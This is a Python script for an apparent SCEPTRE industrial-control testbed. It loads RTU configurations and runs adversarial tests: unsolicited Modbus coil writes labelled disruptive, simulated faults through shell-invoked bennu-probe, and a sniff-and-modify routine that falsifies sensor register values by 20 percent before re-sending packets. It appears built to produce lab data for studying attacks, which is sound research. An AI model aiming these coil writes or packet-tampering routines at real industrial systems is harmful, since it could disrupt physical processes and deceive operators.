import subprocess
import random
import xml.etree.ElementTree as ET
from rtu_spec import RtuMemory,RTU
import time
#from scapy.all import *
#from scapy.contrib.modbus import *
from scapy.all import sniff, TCP, IP, send
from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse

from pymodbus.client import ModbusTcpClient
import sys

MODBUS_PORT = 502

def read_xml_file(file_path):
    """Read an XML file and convert it to a dictionary."""
    tree = ET.parse(file_path)
    root = tree.getroot()
    return {root.tag: xml_to_dict(root)}

def xml_to_dict(element):
    """Recursively convert an XML element and its children to a dictionary."""
    if len(element) == 0:  # If the element has no children
        return element.text.strip() if element.text else None

    result = {}
    for child in element:
        child_dict = xml_to_dict(child)
        if child.tag in result:
            # If the tag already exists, convert it to a list
            if not isinstance(result[child.tag], list):
                result[child.tag] = [result[child.tag]]
            result[child.tag].append(child_dict)
        else:
            result[child.tag] = child_dict

    return result

def process_config(config):
    tags = config['SCEPTRE']['field-device']['tags']['external-tag']
    comms = config['SCEPTRE']['field-device']['comms']
    input = config['SCEPTRE']['field-device']['input']
    output = config['SCEPTRE']['field-device']['output']
    memory_elements = {}
    provider_tags = {}
    rtu = RTU(config["SCEPTRE"]["field-device"]["name"])
    ## Process tags
    for t in tags:
        if t['name'] not in memory_elements:
            e = RtuMemory(t['name'],t['io'],t['type'],rtu)
            memory_elements[t['name']] = e
            provider_tags[t['io']] = e
        else:
            print(f'Collision with {t["name"]}')
    
    ## Process comms
    for protocol,d in comms.items():
        protocol = protocol.split('-')[0]
        if protocol == 'dnp3':
            for da in d['analog-input']:
                memory_elements[da['tag']].address = da['address']
                
                if memory_elements[da['tag']].protocol != '':
                    print(f"protocol collision {da['tag']}")
                memory_elements[da['tag']].protocol = protocol
                rtu.add_memory(memory_elements[da['tag']].address,memory_elements[da['tag']])
            for di in d['binary-input']:
                memory_elements[di['tag']].address = di['address']
                
                if memory_elements[di['tag']].protocol != '':
                    print(f"protocol collision {di['tag']}")
                memory_elements[di['tag']].protocol = protocol
                rtu.add_memory(memory_elements[di['tag']].address,memory_elements[di['tag']])
            for do in d['binary-output']:
                memory_elements[do['tag']].address = do['address']
                
                if memory_elements[do['tag']].protocol != '':
                    print(f"protocol collision {do['tag']}")
                memory_elements[do['tag']].protocol = protocol
                rtu.add_memory(memory_elements[do['tag']].address,memory_elements[do['tag']])
        else:
            for ir in d['input-register']:
                memory_elements[ir['tag']].address = ir['address']
                
                if memory_elements[ir['tag']].protocol != '':
                    print(f"protocol collision {ir['tag']}")
                memory_elements[ir['tag']].protocol = protocol
                rtu.add_memory(memory_elements[ir['tag']].address,memory_elements[ir['tag']])
            for ir in d['discrete-input']:
                memory_elements[ir['tag']].address = ir['address']
                
                if memory_elements[ir['tag']].protocol != '':
                    print(f"protocol collision {ir['tag']}")
                memory_elements[ir['tag']].protocol = protocol
                rtu.add_memory(memory_elements[ir['tag']].address,memory_elements[ir['tag']])
            for ir in d['coil']:
                memory_elements[ir['tag']].address = ir['address']
                
                if memory_elements[ir['tag']].protocol != '':
                    print(f"protocol collision {ir['tag']}")
                memory_elements[ir['tag']].protocol = protocol
                rtu.add_memory(memory_elements[ir['tag']].address,memory_elements[ir['tag']])

    ## Process Input from provider
    for e in input['analog']:
        provider_tags[e['id']].simulation_element = e['name']
    for e in input['binary']:
        provider_tags[e['id']].simulation_element = e['name']

    ## Process Output to provider
    for e in output['binary']:
        provider_tags[e['id']].simulation_element = e['name']

    print(f'Finished with {config["SCEPTRE"]["field-device"]["name"]}')
    return rtu

def write_coil(target_ip,coil_address,coil_value):
    # Connection parameters
    target_port = 502           # Default Modbus TCP port

    # Create a Modbus TCP client
    client = ModbusTcpClient(target_ip, port=target_port)

    # Connect to the Modbus server
    if client.connect():
        print(f"Connected to Modbus server at {target_ip}:{target_port}")

        # Write to the coil
        response = client.write_coil(coil_address, coil_value)

        # Check if the write was successful
        if response.isError():
            print(f"Error writing to coil: {response}")
        else:
            print(f"Successfully wrote {coil_value} to coil at address {coil_address}")

        # Close the connection
        client.close()
    else:
        print(f"Failed to connect to Modbus server at {target_ip}:{target_port}")

def execute_single_command(command):
    """
    Executes a shell command and returns a tuple of (command, output).
    """
    try:
        result = subprocess.run(command, shell=True, check=True,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
    except subprocess.CalledProcessError as e:
        output = f"Error:\n{e.stderr}\n{e.stdout}"
    
    return (command, output)

def suspicious_command_test(rtu_map):
    active = []
    for r in rtu_map.values():
        active.extend(r.get_all_active('modbus'))
    
    complete = []
    for i in range(0,52):
        rand_chance = random.randint(0, len(active))
        if rand_chance not in complete and rand_chance < len(active):
            complete.append(rand_chance)
            rtu = active[rand_chance].parent
            write_coil(rtu.address,int(active[rand_chance].address),False) ## Test Disruptive commands
            time.sleep(5)
            write_coil(rtu.address,int(active[rand_chance].address),True) ## RESET COIL will test non disruptive commands
            time.sleep(5)
            
        else:
            time.sleep(1)

def normal_fault_test(rtu_map):
    active = []
    for r in rtu_map.values():
        active.extend(r.get_all_active('modbus'))
    complete = []
    for i in range(0,52):
        rand_chance = random.randint(0, len(active))
        if rand_chance not in complete and rand_chance < len(active):
            complete.append(rand_chance)
            print(execute_single_command(f"bennu-probe --endpoint tcp://172.16.1.2:5555 --command write --tag {active[rand_chance].simulation_element} --status false"))
            time.sleep(5)
            print(execute_single_command(f"bennu-probe --endpoint tcp://172.16.1.2:5555 --command write --tag {active[rand_chance].simulation_element} --status true"))
            time.sleep(5)

def get_function_code(func_code):
    # Add mapping for function codes to more human-readable names
    func_mapping = {
        1: 'Read Coils',
        2: 'Read Discrete Inputs',
        3: 'Read Holding Registers',
        4: 'Read Input Registers',
        5: 'Write Single Coil',
        6: 'Write Single Register',
        15: 'Write Multiple Coils',
        16: 'Write Multiple Registers'
    }
    return func_mapping.get(func_code, f"Unknown ({func_code})")

def get_value(measure,max,min,c16bitScale):
    slope = c16bitScale / (max - min)
    intercept = -(slope * min)
    value = (measure - intercept) / slope
    return value

def set_value(value,max,min,c16bitScale):
    slope = c16bitScale / (max - min)
    intercept = -(slope * min)
    measure = value * slope + intercept
    return int(measure)

def parse_modbus(packet):
    if packet.haslayer(TCP) and (packet[TCP].dport == MODBUS_PORT or packet[TCP].sport == MODBUS_PORT):
        try:
            payload = bytes(packet[TCP].payload)
            if payload:
                # If Modbus Response
                if packet.haslayer(ModbusADUResponse):
                    modbus_layer = packet.getlayer(ModbusADUResponse)
                    function_code = get_function_code(modbus_layer.funcCode)
                    if packet[TCP].sport == 502 or packet[TCP].dport == 502:
                        protocol = 'modbus'
                    else:
                        protocol = 'ip'
                        
                    payload_fields = []
                    if modbus_layer.funcCode == 4:
                        #payload_fields = get_payload_fields(modbus_layer.payload.fields)
                        uints = modbus_layer.payload.fields['registerVal']
                        values = []
                        for i in range(0,len(uints)):
                            rand_chance = random.randint(1, 1000)
                            val = get_value(uints[i],1800,-600,65535)
                            if rand_chance < 11:
                                changed = True
                                if rand_chance < 5:
                                    print(f'changed val from by -20% {val}:{val * 0.8}')
                                    val= val * 0.8
                                else:
                                    print(f'changed val from by +20% {val}:{val * 1.2}')
                                    val= val * 1.2
                                modbus_layer.payload.fields['registerVal'][i] = set_value(val,1800,-600,65535)
                            values.append(val)
                        send(packet)

        except Exception as e:
            print(f"Error parsing Modbus packet: {e}")


def sensor_test(rtu_map,interface):
    sniff(
        iface=interface,  # You can specify the interface here via command-line argument
        filter=f"tcp port 502",
        prn=parse_modbus,
        store=0,
    )

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 adverse.py <testname> [interface]")
        sys.exit(1)
    
    configs = {}
    rtu_map = {}
    for i in range(1,8):
        configs[f'rtu{i}'] = read_xml_file(f'/home/aherna4/gt/rtu{i}.config')
        #configs[f'rtu{i}'] = read_xml_file(f'/root/rtu{i}.config')

    for k,f in configs.items():
        rtu_map[k] = process_config(f)
        rtu_map[k].address = f'10.1.31.10{rtu_map[k].name.split("-")[1]}'

    #print()
    if sys.argv[1].strip().lower() == 'command':
        suspicious_command_test(rtu_map)
    elif sys.argv[1].strip().lower() == 'fault':
        normal_fault_test(rtu_map)
    elif sys.argv[1].strip().lower() == 'sensor':
        sensor_test(rtu_map,sys.argv[2].strip().lower())


if __name__ == "__main__":
    main()